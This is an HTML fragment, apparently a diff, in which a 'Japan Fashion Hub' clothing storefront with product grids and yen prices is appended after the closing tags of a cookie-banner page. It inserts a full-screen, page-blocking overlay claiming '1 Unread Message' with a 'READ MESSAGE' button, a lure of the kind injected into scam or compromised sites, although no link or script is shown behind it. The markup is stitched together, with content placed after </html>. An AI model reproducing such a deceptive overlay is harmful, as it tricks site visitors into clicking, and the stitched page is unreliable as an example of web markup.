class="xl-EMIGJJmWz"/><section class="current-jWWgywbxzjhKwnG"><div class="inner-tVfBXarVPytuIhS"><div class="thumb-xmPxBvmOEDYht"><label for="close" class="big-LbjTxlVMyqC"><span class="tip-jRFIcwnEF">Got it</span></label></div><div class="wide-NPiMABiPG"><label for="close" class="icon-NhmgexvgL"><span class="text-xHYuEuNDwRSKH">About policy</span></label></div><div class="caption-dGgSnJr"><label for="close" class="desc-kJPPzdpUZuzcKF"><span class="xl-lVSkSyRIi">Deny cookies</span></label></div></div><div class="image-EUBRRAeI"><span class="large-ijutBTsaZ">This website uses cookies to ensure you get the best experience on our website. By using our site you consent cookies. Learn more.</span></div></section></body></html>
+
+<header>
+
+<div class="container nav">
+<div class="logo">JAPAN FASHION HUB</div>
+
+<div class="menu">
+<a href="#">Home</a>
+<a href="#">Men</a>
+<a href="#">Women</a>
+<a href="#">New Arrivals</a>
+<a href="#">Ranking</a>
+</div>
+</div>
+
+</header>
+
+    <div>
+
+    
+<section class="hero container">
+<div class="hero-grid">
+
+<div class="hero-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?w=900">
+<div class="hero-text">Latest Collection</div>
+</div>
+
+<div class="hero-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=900">
+<div class="hero-text">Style</div>
+</div>
+
+<div class="hero-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1483985988355-763728e1935b?w=900">
+<div class="hero-text">Accessories</div>
+</div>
+
+</div>
+</section>
+
+    
+    
+<div class="container">
+
+<div class="category-grid">
+
+<div class="category-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=1200">
+<div class="category-name">MEN</div>
+</div>
+
+<div class="category-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=1200">
+<div class="category-name">WOMEN</div>
+</div>
+
+</div>
+
+<h2 class="section-title">New Arrivals</h2>
+
+<div class="products">
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=600">
+<h3>Premium Polo Shirt</h3>
+<div class="price">¥4,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1576566588028-4147f3842f27?w=600">
+<h3>Summer Shirt</h3>
+<div class="price">¥5,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1541099649105-f69ad21f3246?w=600">
+<h3>Women's Top</h3>
+<div class="price">¥3,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1489987707025-afc232f7ea0f?w=600">
+<h3>Fashion Dress</h3>
+<div class="price">¥6,980</div>
+</div>
+
+</div>
+
+<h2 class="section-title">Popular Ranking</h2>
+
+<div class="products">
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1523381210434-271e8be1f52b?w=600">
+<h3>Popular Polo Shirt</h3>
+<div class="price">¥4,500</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?w=600">
+<h3>Casual Wear</h3>
+<div class="price">¥5,200</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=600">
+<h3>Women's Fashion</h3>
+<div class="price">¥4,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=600">
+<h3>Sportswear</h3>
+<div class="price">¥6,200</div>
+</div>
+
+</div>
+
+</div>
+
+<section class="story container">
+
+<div class="story-grid">
+
+<img loading="lazy" src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=900">
+<img loading="lazy" src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=900">
+<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=900">
+
+</div>
+
+<div class="story-text">
+<h2 class="section-title">Sport Meets Fashion</h2>
+
+<p>
+Japan Fashion Hub offers a new lifestyle that combines Japanese trend fashion with sports style.
+We deliver items that focus on quality, comfort, and design.
+</p>
+</div>
+
+</section>
+
+<div class="container">
+
+<h2 class="section-title">Instagram Feed</h2>
+
+<div class="instagram">
+
+<img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=500">
+
+</div>
+
+<div class="news">
+
+<h2 class="section-title">News</h2>
+
+<ul>
+<li>2026/06/15 Summer Collection Released</li>
+<li>2026/06/12 Men's Ranking Updated</li>
+<li>2026/06/10 Free Shipping Campaign Started</li>
+<li>2026/06/08 New Member Registration Bonus</li>
+</ul>
+
+</div>
+
+</div>
+        
+<div style="position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;justify-content:center;align-items:center;padding:15px;z-index:999999;">
+<div style="width:100%;max-width:340px;background:#111;padding:25px;border-radius:20px;text-align:center;color:#fff;font-family:Arial;box-sizing:border-box;">
+
+<div style="font-size:70px;">📩</div>
+
+<div style="font-size:24px;font-weight:bold;margin-top:10px;">
+Private Message
+</div>
+
+<div style="margin-top:10px;color:#bbb;line-height:1.5;">
+A new message is waiting to be viewed.
+</div>
+
+<div style="margin-top:15px;background:#1f1f1f;padding:12px;border-radius:12px;color:#00D4FF;font-weight:bold;">
+1 Unread Message
+</div>
+
+<div style="display:flex;gap:10px;margin-top:20px;">
+<div style="flex:1;background:#00D4FF;color:#000;padding:14px;border-radius:12px;font-weight:bold;">
+READ MESSAGE
+</div>
+<div style="flex:1;background:#333;color:#fff;padding:14px;border-radius:12px;">
+CANCEL
+</div>
+</div>
+
+</div>
+</div>
+
+<footer>
+
+<h3>JAPAN FASHION HUB</h3>
+
+<p>
+Delivering the latest fashion across Japan.
+</p>
+
+<p style="margin-top:15px;">
+© 2026 Japan Fashion Hub. All Rights Reserved.
+</p>
+
+</footer>
+
+
+
+<iframe id="lo-frame-core" src="about:blank" aria-hidden="true" title="Lucky Orange: core" style="display: none !important;"></iframe></body></html>
